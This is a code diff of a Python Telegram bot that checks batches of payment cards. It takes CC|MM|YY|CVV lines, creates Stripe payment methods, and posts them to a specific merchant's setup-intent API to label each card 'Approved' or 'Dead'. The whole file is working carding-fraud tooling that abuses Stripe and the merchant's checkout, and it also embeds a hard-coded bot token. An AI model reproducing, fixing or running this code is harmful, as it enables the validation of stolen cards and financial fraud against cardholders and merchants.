@@ -3,39 +3,33 @@ import requests
 import re
 import time
 import threading
-import json
 
 BOT_TOKEN = "7194711538:AAHiP8JKzuhuJx72REyy6sMsRdttaPdvWAY"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Global flag and lock for stopping the checking process
-stop_flag = False
-stop_lock = threading.Lock()
-
 def parse_card_input(text):
+    """
+    Parse card input formats: CC|MM|YY|CVV or CC|MM|YYYY|CVV
+    Accepts | or / as separator.
+    """
     pattern = r'^(\d{12,19})[|/](\d{2})[|/](\d{2,4})[|/](\d{3,4})$'
     match = re.match(pattern, text.strip())
     if not match:
         return None
     cc, mm, yy, cvv = match.groups()
     if len(yy) == 4:
-        yy = yy[2:]
+        yy = yy[2:]  # convert YYYY to YY
     return cc, mm, yy, cvv
 
 def check_single_card(card_text, chat_id):
-    global stop_flag
-    with stop_lock:
-        if stop_flag:
-            bot.send_message(chat_id, "🛑 Checking stopped by user.")
-            return False  # Signal to stop processing
-
     card_data = parse_card_input(card_text)
     if not card_data:
         bot.send_message(chat_id, f"❌ Invalid format for card: `{card_text}`\nPlease use CC|MM|YY|CVV or CC|MM|YYYY|CVV", parse_mode='Markdown')
-        return True
+        return
 
     cc, mm, yy, cvv = card_data
 
+    # Step 1: Create Stripe Payment Method
     stripe_url = "https://api.stripe.com/v1/payment_methods"
     stripe_payload = {
         'type': 'card',
@@ -59,18 +53,19 @@ def check_single_card(card_text, chat_id):
         stripe_json = stripe_resp.json()
     except Exception as e:
         bot.send_message(chat_id, f"🔴 Error connecting to Stripe API for card `{card_text}`:\n{str(e)}")
-        return True
+        return
 
     if 'error' in stripe_json:
         error_msg = stripe_json['error'].get('message', 'Unknown Stripe error')
         bot.send_message(chat_id, f"❌ Stripe error for card `{card_text}`: {error_msg}")
-        return True
+        return
 
     pm_id = stripe_json.get('id')
     if not pm_id:
         bot.send_message(chat_id, f"❌ Failed to get payment method ID from Stripe for card `{card_text}`.")
-        return True
+        return
 
+    # Step 2: Use pm_id in Bloomingriders API to create setup intent
     br_url = "https://www.bloomingriders.com/api/student/checkout/stripe/create-setup-intent"
     br_headers = {
         'accept': 'application/json, text/plain, */*',
@@ -95,45 +90,28 @@ def check_single_card(card_text, chat_id):
         br_json_resp = br_resp.json()
     except Exception as e:
         bot.send_message(chat_id, f"🔴 Error connecting to Bloomingriders API for card `{card_text}`:\n{str(e)}")
-        return True
+        return
 
-    full_response = json.dumps(br_json_resp, indent=2, ensure_ascii=False)
-
+    # Check if "error" key exists in final response JSON
     if "error" in br_json_resp:
-        result_msg = f"❌ Card Declined (Dead) for `{card_text}`\nError: {br_json_resp['error']}\n\nFull response:\n{full_response}"
+        result_msg = f"❌ Card Declined (Dead) for `{card_text}`\nError: {br_json_resp['error']}"
     else:
-        result_msg = f"✅ Card Approved (Success) for `{card_text}`\n\nFull response:\n{full_response}"
+        result_msg = f"✅ Card Approved (Success) for `{card_text}`"
 
     bot.send_message(chat_id, result_msg)
-    return True
 
 def process_cards(cards, chat_id):
-    global stop_flag
-    with stop_lock:
-        stop_flag = False  # Reset stop flag at start
-
+    """
+    Process list of cards one by one, with 15 seconds delay between each.
+    """
     for idx, card in enumerate(cards):
-        with stop_lock:
-            if stop_flag:
-                bot.send_message(chat_id, "🛑 Checking stopped by user.")
-                break
-
         card = card.strip()
         if not card:
             continue
-
-        proceed = check_single_card(card, chat_id)
-        if not proceed:
-            break
-
-        # Delay 15 seconds between cards except after last card or if stopped
+        check_single_card(card, chat_id)
+        # Don't delay after last card
         if idx != len(cards) - 1:
-            for _ in range(15):
-                with stop_lock:
-                    if stop_flag:
-                        bot.send_message(chat_id, "🛑 Checking stopped by user.")
-                        return
-                time.sleep(1)
+            time.sleep(15)
 
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
@@ -141,23 +119,17 @@ def send_welcome(message):
         "Send me one or multiple cards to check.\n"
         "Use format per card:\nCC|MM|YY|CVV or CC|MM|YYYY|CVV\n"
         "Separate multiple cards by new lines.\n\n"
-        "Example:\n4111111111111111|12|25|123\n5555555555554444|11|2026|456\n\n"
-        "Send /stop to immediately stop ongoing checks.")
-
-@bot.message_handler(commands=['stop'])
-def stop_checking(message):
-    global stop_flag
-    with stop_lock:
-        stop_flag = True
-    bot.reply_to(message, "🛑 Received stop command. Stopping checks as soon as possible...")
+        "Example:\n4111111111111111|12|25|123\n5555555555554444|11|2026|456")
 
 @bot.message_handler(func=lambda m: True)
 def handle_cards(message):
+    # Split message by lines to get multiple cards
     cards = message.text.strip().split('\n')
     if len(cards) == 0:
         bot.reply_to(message, "❌ No cards found in your message.")
         return
 
+    # Run card processing in a separate thread so bot doesn't block
     threading.Thread(target=process_cards, args=(cards, message.chat.id), daemon=True).start()
 
 bot.polling()
